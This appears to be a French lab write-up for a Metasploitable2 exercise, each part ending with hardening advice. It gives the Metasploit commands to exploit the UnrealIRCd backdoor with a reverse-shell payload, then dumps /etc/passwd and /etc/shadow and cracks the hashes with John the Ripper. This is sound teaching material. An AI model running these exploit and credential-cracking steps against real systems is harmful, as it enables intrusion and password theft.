# Exploitation d'UnrealIRCd avec Metasploit

### Commandes à exécuter sur la console Kali

```bash
msfconsole
search ircd
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST 10.6.0.7
set RPORT 6667
set PAYLOAD cmd/unix/reverse
set LHOST 10.6.0.9
run
```
*Astuces:*
Mettre en background : Ctrl + Z <br>
Reprendre sessions <br>
session + (numero id)

## Recommandation de sécurité
- Désinstaller UnrealIRCd et supprimer les fichiers de configuration compromis
- Télécharger et installer une version sécurisée depuis le site officiel
- Autoriser uniquement des IP spécifiques
- Désactiver les connexions anonymes
- Activation des logs et supervision
- Activer la journalisation des connexions et surveiller les accès
- Bloquer les connexions IRC non autorisées
- Installer fail2ban pour limiter les tentatives de connexion suspectes


# Déchiffrer le hash des mots de passe

```bash
# Metasploit
cat /etc/passwd # copier coller dans un fichier passwd.dmp sur la Kali

# Kali
cat /etc/shadow # copier coller dans un fichier shadow.dmp sur la Kali

unshadow passwd.dmp shadow.dmp > credentials

cat /usr/share/wordlists/metasploitable2 # Fichier avec les mots de passe (attention, éviter les caractère type "@")

john --wordlist=/usr/share/wordlists/metasploitable2 credentials

```

![Déchiffrement du hash MD5](Images/dechiffrement_hash_mdp.png)

> Note : <br>
> Nous sommes dans un cas particulier mais la commande standard ressemble plus à cela :
```bash
 john --wordlist=/usr/share/wordlists/metasploitable2 --format=sha512crypt credentials 
```

 ## Recommandation de sécurité
- Utiliser des fonctions de hachage sécurisées (ex. : bcrypt, scrypt, Argon2)
- Ajouter un sel (= donnée aléatoire) unique à chaque mot de passe
- Imposer des règles strictes sur les mots de passe (longueur minimale, complexité)
- Restreindre l’accès aux fichiers sensibles (notamment /etc/shadow et /etc/passwd)
- Surveiller l’accès aux systèmes (avec IDS et alertes)
- Utiliser l’authentification multi-facteurs (MFA)
- Maintenir les systèmes à jour